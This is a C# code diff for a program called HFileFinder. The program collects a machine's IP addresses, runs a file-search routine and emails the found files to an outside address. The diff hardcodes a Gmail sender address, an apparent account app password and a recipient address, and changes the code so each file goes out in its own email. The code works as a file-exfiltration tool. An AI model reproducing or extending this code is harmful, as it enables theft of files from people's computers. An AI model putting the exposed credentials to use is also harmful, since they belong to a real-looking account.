@@ -5,11 +5,12 @@ namespace HFileFinder
 {
     class Program
     {
-        private static string email = "email";//Enter yours
-        private static string password = "password";//Enter yours
+        private static string email = "hb.webscraper@gmail.com";//Enter yours
+        private static string password = "qkujzupvknglknbk";//Enter yours
         private static string displayName = "HFileFinder";
-        private static string to = "to";//Enter yours
-        private static string subject = Environment.MachineName + "/" + Environment.UserName + " : ";
+        private static string to = "masoudkarimi530@gmail.com";//Enter yours
+        //private static string subject = Environment.MachineName + ":" + Environment.UserName + " : ";
+        private static string subject = "Test";
         private static string body = "";
 
         static void Main(string[] args)
@@ -20,9 +21,9 @@ namespace HFileFinder
             {
                 body += (ip.ToString()) + "\n";
             }
-
+            body = "";
             //Main work
-            FileFinder.Main();
+            FileFinder.Work();
 
             //Send datas by email service
             int filesCount = FileFinder.path.Length;
@@ -30,8 +31,10 @@ namespace HFileFinder
             for (int i = 0; i < filesCount; i++)
             {
                 files[i] = i + ".txt";
+                Send.SendEmail(email, password, displayName, to, subject, body, files[i]);
             }
-            Send.SendEmail(email, password, displayName, to, subject, body, files);
+
+            Console.ReadKey();
         }
     }
 }
